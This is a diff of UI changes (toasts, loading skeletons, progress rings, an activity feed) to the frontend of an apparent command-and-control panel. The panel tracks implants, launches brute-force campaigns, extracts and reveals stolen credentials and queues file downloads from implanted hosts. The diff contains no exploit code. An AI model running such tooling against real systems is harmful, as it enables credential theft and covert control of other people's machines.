@@ -105,6 +105,27 @@ class App {
   canEdit() { return this.role === 'admin' || this.role === 'operator'; }
   isAdmin() { return this.role === 'admin'; }
 
+  showToast(msg, type = 'info') {
+    let container = document.getElementById('toast-container');
+    if (!container) {
+      container = document.createElement('div');
+      container.id = 'toast-container';
+      container.className = 'toast-container';
+      document.body.appendChild(container);
+    }
+    const icons = { success: '✓', error: '✗', warning: '⚠', info: 'ℹ' };
+    const toast = document.createElement('div');
+    toast.className = `toast toast-${type}`;
+    toast.innerHTML = `<span class="toast-icon">${icons[type] || icons.info}</span><span class="toast-msg">${esc(msg)}</span><span class="toast-close" onclick="this.parentElement.classList.add('toast-exit');setTimeout(()=>this.parentElement.remove(),250)">✕</span>`;
+    container.appendChild(toast);
+    setTimeout(() => {
+      if (toast.parentElement) {
+        toast.classList.add('toast-exit');
+        setTimeout(() => toast.remove(), 250);
+      }
+    }, 4000);
+  }
+
   logout() {
     sessionStorage.removeItem('shardc2_token');
     sessionStorage.removeItem('shardc2_role');
@@ -130,6 +151,19 @@ class App {
     }
     const settingsLink = document.querySelector('[data-page="settings"]');
     if (settingsLink) settingsLink.style.display = this.isAdmin() ? '' : 'none';
+    const sidebar = document.getElementById('sidebar');
+    if (sidebar && !sidebar.querySelector('.sidebar-collapse-btn')) {
+      const btn = document.createElement('button');
+      btn.className = 'sidebar-collapse-btn';
+      btn.innerHTML = '&#9664;';
+      btn.onclick = () => {
+        const appEl = document.getElementById('app');
+        appEl.classList.toggle('sidebar-collapsed');
+        btn.innerHTML = appEl.classList.contains('sidebar-collapsed') ? '&#9654;' : '&#9664;';
+      };
+      const navLinks = sidebar.querySelector('.nav-links');
+      if (navLinks) navLinks.insertAdjacentElement('afterend', btn);
+    }
     this.connectWS();
     this.loadSafetyBanner();
     this.navigate('dashboard');
@@ -246,6 +280,12 @@ class App {
       settings: () => this.renderSettings(),
     };
 
+    const content = document.getElementById('content');
+    if (content) {
+      content.classList.remove('page-fade-in');
+      void content.offsetWidth;
+      content.classList.add('page-fade-in');
+    }
     if (renders[page]) renders[page]();
   }
 
@@ -257,14 +297,61 @@ class App {
         <h1 class="page-title">OVERVIEW</h1>
         <span class="page-tag">REAL-TIME</span>
       </div>
-      <div class="stats-grid" id="stats-grid"></div>
-      <div class="section-header">
-        <span class="section-title">ACTIVE IMPLANTS</span>
-        <span class="refresh-hint">AUTO-REFRESH // 10s</span>
+      <div class="stats-grid" id="stats-grid">
+        <div class="stat-card"><div class="skeleton" style="height:1rem;width:80px;margin-bottom:0.5rem"></div><div class="skeleton" style="height:2rem;width:50px"></div></div>
+        <div class="stat-card"><div class="skeleton" style="height:1rem;width:80px;margin-bottom:0.5rem"></div><div class="skeleton" style="height:2rem;width:50px"></div></div>
+        <div class="stat-card"><div class="skeleton" style="height:1rem;width:80px;margin-bottom:0.5rem"></div><div class="skeleton" style="height:2rem;width:50px"></div></div>
+        <div class="stat-card"><div class="skeleton" style="height:1rem;width:80px;margin-bottom:0.5rem"></div><div class="skeleton" style="height:2rem;width:50px"></div></div>
       </div>
-      <div id="dash-bots"></div>`;
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:1.2rem;margin-bottom:1.2rem">
+        <div>
+          <div class="section-header">
+            <span class="section-title">ACTIVITY FEED</span>
+            <span class="refresh-hint">LIVE</span>
+          </div>
+          <div id="activity-feed" class="activity-feed" style="background:var(--bg-card);border:1px solid var(--border);padding:0.8rem;min-height:200px">
+            <div class="skeleton-row"><div class="skeleton-cell w-sm"></div><div class="skeleton-cell w-xl"></div><div class="skeleton-cell w-md"></div></div>
+            <div class="skeleton-row"><div class="skeleton-cell w-sm"></div><div class="skeleton-cell w-xl"></div><div class="skeleton-cell w-md"></div></div>
+            <div class="skeleton-row"><div class="skeleton-cell w-sm"></div><div class="skeleton-cell w-xl"></div><div class="skeleton-cell w-md"></div></div>
+          </div>
+        </div>
+        <div>
+          <div class="section-header">
+            <span class="section-title">ACTIVE IMPLANTS</span>
+            <span class="refresh-hint">AUTO-REFRESH // 10s</span>
+          </div>
+          <div id="dash-bots"></div>
+        </div>
+      </div>`;
     await this.refreshDashboard();
-    this.refreshTimer = setInterval(() => this.refreshDashboard(), 10000);
+    this.loadActivityFeed();
+    this.refreshTimer = setInterval(() => { this.refreshDashboard(); this.loadActivityFeed(); }, 10000);
+  }
+
+  async loadActivityFeed() {
+    try {
+      const data = await this.api.get('/audit/events?limit=20');
+      const events = data.events || [];
+      const el = document.getElementById('activity-feed');
+      if (!el) return;
+      if (events.length === 0) {
+        el.innerHTML = '<div style="color:var(--text-muted);font-size:0.75rem;text-align:center;padding:2rem">NO RECENT ACTIVITY</div>';
+        return;
+      }
+      el.innerHTML = events.map(e => {
+        let dotClass = 'auth';
+        if (e.action.includes('command') || e.action.includes('cmd')) dotClass = 'cmd';
+        else if (e.action.includes('campaign')) dotClass = 'campaign';
+        else if (e.action.includes('credential') || e.action.includes('cred')) dotClass = 'cred';
+        else if (e.action.includes('bot') || e.action.includes('agent') || e.action.includes('register')) dotClass = 'agent';
+        const actor = e.operator || 'system';
+        return `<div class="activity-item">
+          <div class="activity-dot ${dotClass}"></div>
+          <div class="activity-text"><strong>${esc(actor)}</strong> ${esc(e.action)}${e.object_type ? ` on <strong>${esc(e.object_type)}</strong>` : ''}${e.outcome === 'denied' ? ' <span style="color:var(--red-bright)">[DENIED]</span>' : ''}</div>
+          <div class="activity-time">${timeAgo(e.created_at)}</div>
+        </div>`;
+      }).join('');
+    } catch (e) {}
   }
 
   async refreshDashboard() {
@@ -277,11 +364,21 @@ class App {
 
       const statsEl = document.getElementById('stats-grid');
       if (!statsEl) return;
+
+      const prevStats = this._prevStats || {};
+      const delta = (key, val) => {
+        if (prevStats[key] === undefined) return '';
+        const diff = val - prevStats[key];
+        if (diff === 0) return '<div class="stat-delta neutral">—</div>';
+        return `<div class="stat-delta ${diff > 0 ? 'up' : 'down'}">${diff > 0 ? '▲' : '▼'} ${Math.abs(diff)}</div>`;
+      };
+      this._prevStats = { total_bots: stats.total_bots, active_bots: stats.active_bots, pending_commands: stats.pending_commands, active_campaigns: stats.active_campaigns };
+
       statsEl.innerHTML = `
-        <div class="stat-card"><div class="stat-label">Total Implants</div><div class="stat-value red">${stats.total_bots}</div></div>
-        <div class="stat-card"><div class="stat-label">Active</div><div class="stat-value green">${stats.active_bots}</div></div>
-        <div class="stat-card"><div class="stat-label">Pending Cmds</div><div class="stat-value yellow">${stats.pending_commands}</div></div>
-        <div class="stat-card"><div class="stat-label">Campaigns</div><div class="stat-value crimson">${stats.active_campaigns}/${stats.total_campaigns}</div></div>`;
+        <div class="stat-card"><div class="stat-label">Total Implants</div><div class="stat-value red">${stats.total_bots}</div>${delta('total_bots', stats.total_bots)}</div>
+        <div class="stat-card"><div class="stat-label">Active</div><div class="stat-value green">${stats.active_bots}</div>${delta('active_bots', stats.active_bots)}</div>
+        <div class="stat-card"><div class="stat-label">Pending Cmds</div><div class="stat-value yellow">${stats.pending_commands}</div>${delta('pending_commands', stats.pending_commands)}</div>
+        <div class="stat-card"><div class="stat-label">Campaigns</div><div class="stat-value crimson">${stats.active_campaigns}/${stats.total_campaigns}</div>${delta('active_campaigns', stats.active_campaigns)}</div>`;
 
       const el = document.getElementById('dash-bots');
       if (!el) return;
@@ -320,7 +417,9 @@ class App {
         <span class="section-title">REGISTERED IMPLANTS</span>
         <span class="refresh-hint">AUTO-REFRESH // 10s</span>
       </div>
-      <div id="bots-table"></div>`;
+      <div id="bots-table">
+        <div style="padding:1rem"><div class="skeleton-row"><div class="skeleton-cell w-sm"></div><div class="skeleton-cell w-lg"></div><div class="skeleton-cell w-md"></div><div class="skeleton-cell w-md"></div><div class="skeleton-cell w-sm"></div></div><div class="skeleton-row"><div class="skeleton-cell w-sm"></div><div class="skeleton-cell w-lg"></div><div class="skeleton-cell w-md"></div><div class="skeleton-cell w-md"></div><div class="skeleton-cell w-sm"></div></div><div class="skeleton-row"><div class="skeleton-cell w-sm"></div><div class="skeleton-cell w-lg"></div><div class="skeleton-cell w-md"></div><div class="skeleton-cell w-md"></div><div class="skeleton-cell w-sm"></div></div></div>
+      </div>`;
     await this.refreshBots();
     this.refreshTimer = setInterval(() => this.refreshBots(), 10000);
   }
@@ -696,7 +795,9 @@ class App {
         <div id="cred-filters" class="bot-chips" style="margin-bottom:0.5rem"></div>
         <button class="btn-sm" onclick="app.refreshCredentials()">REFRESH</button>
       </div>
-      <div id="creds-table"></div>`;
+      <div id="creds-table">
+        <div style="padding:1rem"><div class="skeleton-row"><div class="skeleton-cell w-md"></div><div class="skeleton-cell w-lg"></div><div class="skeleton-cell w-sm"></div><div class="skeleton-cell w-lg"></div><div class="skeleton-cell w-xl"></div></div><div class="skeleton-row"><div class="skeleton-cell w-md"></div><div class="skeleton-cell w-lg"></div><div class="skeleton-cell w-sm"></div><div class="skeleton-cell w-lg"></div><div class="skeleton-cell w-xl"></div></div></div>
+      </div>`;
     await this.refreshCredentials();
   }
 
@@ -718,9 +819,8 @@ class App {
   }
 
   credCategoryBadge(cat) {
-    const colors = {login:'var(--red)',ssh_key:'var(--cyan)',api_key:'var(--yellow)',env_secret:'var(--green)',db_connection:'#b388ff',cloud_token:'var(--orange, #ff9800)',shell_history:'var(--text-muted)',misc:'var(--text-dim)'};
-    const color = colors[cat] || 'var(--text-dim)';
-    return `<span class="badge" style="border-color:${color};color:${color}">${esc(cat).toUpperCase().replace('_',' ')}</span>`;
+    const cls = 'badge-' + (cat || 'misc').replace(/_/g, '-');
+    return `<span class="badge ${cls}">${esc(cat || 'misc').toUpperCase().replace(/_/g,' ')}</span>`;
   }
 
   credValueDisplay(c) {
@@ -780,7 +880,7 @@ class App {
         td.title = data.password || '';
       }
     } catch (e) {
-      alert('Failed to reveal credential: ' + e.message);
+      this.showToast('Failed to reveal credential: ' + e.message, 'error');
     }
   }
 
@@ -1030,12 +1130,12 @@ class App {
     const config = this.buildCampaignConfig();
     const botIds = this.getSelectedBotIds();
 
-    if (!name) { alert('Operation name required'); return; }
+    if (!name) { this.showToast('Operation name required', 'warning'); return; }
     const isExternalBrute = type === 'brute' && config.includes('"external"');
-    if (botIds.length === 0 && !isExternalBrute) { alert('Select at least one implant'); return; }
+    if (botIds.length === 0 && !isExternalBrute) { this.showToast('Select at least one implant', 'warning'); return; }
 
     const result = await this.api.post('/campaigns/', { name, type, description: desc, config });
-    if (!result.id) { alert('Failed to create campaign'); return; }
+    if (!result.id) { this.showToast('Failed to create campaign', 'error'); return; }
 
     await this.api.post(`/campaigns/${result.id}/bots`, { bot_ids: botIds });
 
@@ -1067,10 +1167,14 @@ class App {
       <thead><tr><th>Operation</th><th>Type</th><th>Status</th><th>Bots</th><th>Progress</th><th>Created</th><th>Actions</th></tr></thead>
       <tbody>${camps.map(c => {
         const pct = c.total_tasks > 0 ? Math.round((c.completed_tasks + c.failed_tasks) / c.total_tasks * 100) : 0;
+        const ringColor = c.failed_tasks > c.completed_tasks ? 'var(--red)' : pct === 100 ? 'var(--green)' : 'var(--cyan)';
+        const circumference = 2 * Math.PI * 24;
+        const dashoffset = circumference - (pct / 100) * circumference;
         const progressHtml = c.total_tasks > 0
           ? `<div style="display:flex;align-items:center;gap:0.5rem">
-              <div style="flex:1;background:var(--bg-input);height:8px;border:1px solid var(--border);min-width:80px">
-                <div style="height:100%;width:${pct}%;background:${c.failed_tasks > c.completed_tasks ? 'var(--red)' : 'var(--green)'};transition:width 0.3s"></div>
+              <div class="ring-chart" style="width:36px;height:36px">
+                <svg width="36" height="36" viewBox="0 0 56 56"><circle class="ring-bg" cx="28" cy="28" r="24"/><circle class="ring-progress" cx="28" cy="28" r="24" stroke="${ringColor}" stroke-dasharray="${circumference}" stroke-dashoffset="${dashoffset}"/></svg>
+                <div class="ring-label" style="font-size:0.55rem">${pct}%</div>
               </div>
               <span style="font-size:0.65rem;color:var(--text-secondary)">${c.completed_tasks}/${c.total_tasks}</span>
             </div>`
@@ -1154,17 +1258,28 @@ class App {
             ${camp.description ? `<div class="camp-meta-item"><span class="camp-meta-label">Brief</span><span class="camp-meta-value">${esc(camp.description)}</span></div>` : ''}
           </div>
 
-          ${progress.total > 0 ? `
-            <div class="progress-wrap">
-              <div class="progress-bar ${isComplete ? 'complete' : ''}" style="width:${pct}%"></div>
-              <div class="progress-text">${pct}% - ${progress.completed + progress.failed}/${progress.total} TASKS</div>
-            </div>
-            <div class="progress-stats">
-              <span><span class="dot-green">&#9632;</span> Completed: ${progress.completed}</span>
-              <span><span class="dot-red">&#9632;</span> Failed: ${progress.failed}</span>
-              <span><span class="dot-yellow">&#9632;</span> Pending: ${progress.pending}</span>
-            </div>
-          ` : '<div style="color:var(--text-muted);font-size:0.75rem;margin-top:0.5rem">No tasks generated yet. Launch the campaign to begin.</div>'}
+          ${progress.total > 0 ? (() => {
+            const ringColor = progress.failed > progress.completed ? 'var(--red)' : isComplete ? 'var(--green)' : 'var(--cyan)';
+            const circ = 2 * Math.PI * 24;
+            const off = circ - (pct / 100) * circ;
+            return `<div style="display:flex;align-items:center;gap:1.2rem;margin-top:0.8rem">
+              <div class="ring-chart">
+                <svg width="64" height="64" viewBox="0 0 56 56"><circle class="ring-bg" cx="28" cy="28" r="24"/><circle class="ring-progress" cx="28" cy="28" r="24" stroke="${ringColor}" stroke-dasharray="${circ}" stroke-dashoffset="${off}"/></svg>
+                <div class="ring-label">${pct}%</div>
+              </div>
+              <div>
+                <div class="progress-wrap" style="min-width:200px">
+                  <div class="progress-bar ${isComplete ? 'complete' : ''}" style="width:${pct}%"></div>
+                  <div class="progress-text">${progress.completed + progress.failed}/${progress.total} TASKS</div>
+                </div>
+                <div class="progress-stats">
+                  <span><span class="dot-green">&#9632;</span> Completed: ${progress.completed}</span>
+                  <span><span class="dot-red">&#9632;</span> Failed: ${progress.failed}</span>
+                  <span><span class="dot-yellow">&#9632;</span> Pending: ${progress.pending}</span>
+                </div>
+              </div>
+            </div>`;
+          })() : '<div style="color:var(--text-muted);font-size:0.75rem;margin-top:0.5rem">No tasks generated yet. Launch the campaign to begin.</div>'}
         </div>
 
         ${camp.status === 'created' ? `
@@ -1259,9 +1374,10 @@ class App {
   async launchCampaign(id) {
     const result = await this.api.post(`/campaigns/${id}/launch`);
     if (result.error) {
-      alert(result.error);
+      this.showToast(result.error, 'error');
       return;
     }
+    this.showToast('Campaign launched', 'success');
     if (this.activeCampaignId === id) {
       this.renderCampaignDetail(id);
     } else {
@@ -1301,9 +1417,10 @@ class App {
     const autoStart = confirm('Replay this campaign?\n\nOK = Create & Launch immediately\nCancel = Just create (edit before launching)');
     const result = await this.api.post(`/campaigns/${id}/replay`, { auto_start: autoStart });
     if (result.error) {
-      alert(result.error);
+      this.showToast(result.error, 'error');
       return;
     }
+    this.showToast('Campaign replayed', 'success');
     this.activeCampaignId = result.id;
     clearInterval(this.refreshTimer);
     await this.renderCampaignDetail(result.id);
@@ -1322,7 +1439,7 @@ class App {
       a.click();
       URL.revokeObjectURL(a.href);
     } catch (e) {
-      alert('Export failed: ' + e.message);
+      this.showToast('Export failed: ' + e.message, 'error');
     }
   }
 
@@ -1332,14 +1449,16 @@ class App {
     try {
       const result = await this.api.post(`/campaigns/${id}/extract`);
       if (result.error) {
-        alert('Extract failed: ' + result.error);
+        this.showToast('Extract failed: ' + result.error, 'error');
+        if (btn) { btn.disabled = false; btn.textContent = 'EXTRACT SECRETS'; }
         return;
       }
       const msg = `Extracted ${result.extracted} secrets (${result.new} new, ${result.duplicates} duplicates)`;
+      this.showToast(msg, 'success');
       if (btn) { btn.textContent = msg; btn.style.color = 'var(--green)'; }
       setTimeout(() => { if (btn) { btn.textContent = 'EXTRACT SECRETS'; btn.disabled = false; btn.style.color = ''; } }, 4000);
     } catch (e) {
-      alert('Extract failed: ' + e.message);
+      this.showToast('Extract failed: ' + e.message, 'error');
       if (btn) { btn.disabled = false; btn.textContent = 'EXTRACT SECRETS'; }
     }
   }
@@ -1543,14 +1662,15 @@ class App {
     const username = document.getElementById('op-username').value.trim();
     const password = document.getElementById('op-password').value.trim();
     const role = document.getElementById('op-role').value;
-    if (!username || !password) { alert('Username and password required'); return; }
+    if (!username || !password) { this.showToast('Username and password required', 'warning'); return; }
     try {
       await this.api.post('/operators', { username, password, role });
       document.getElementById('op-username').value = '';
       document.getElementById('op-password').value = '';
+      this.showToast(`Operator ${username} created`, 'success');
       await this.refreshOperators();
     } catch (e) {
-      alert('Failed to create operator: ' + e.message);
+      this.showToast('Failed to create operator: ' + e.message, 'error');
     }
   }
 
@@ -1560,7 +1680,7 @@ class App {
       await this.api.del(`/operators/${id}`);
       await this.refreshOperators();
     } catch (e) {
-      alert('Failed to delete operator: ' + e.message);
+      this.showToast('Failed to delete operator: ' + e.message, 'error');
     }
   }
 
@@ -1705,9 +1825,9 @@ class App {
         type: 'download',
         payload: path,
       });
-      alert(`Download command queued for: ${path}\nCheck terminal for base64 output.`);
+      this.showToast(`Download queued: ${path}`, 'success');
     } catch (e) {
-      alert(`Failed: ${e.message}`);
+      this.showToast(`Download failed: ${e.message}`, 'error');
     }
   }
 }
